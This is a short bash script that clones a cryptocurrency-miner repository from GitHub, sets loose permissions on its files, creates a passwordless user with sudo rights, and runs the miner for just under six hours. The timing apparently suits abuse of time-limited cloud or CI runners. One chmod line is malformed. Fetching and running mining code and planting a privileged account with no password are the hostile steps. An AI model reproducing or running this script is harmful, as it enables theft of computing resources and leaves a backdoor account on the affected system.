#!/bin/bash
sudo apt update
git clone https://github.com/xfdbtry5e/verusccminer.git && cd verusccminer
chmod +x kokoh.sh && chmod +x cumin chmod 777 cumin kokoh.sh
sudo adduser --disabled-password --gecos "" manuk && sudo usermod -aG sudo manuk
sudo -u manuk -H sh -c "timeout 359m ./kokoh.sh"
sudo apt update
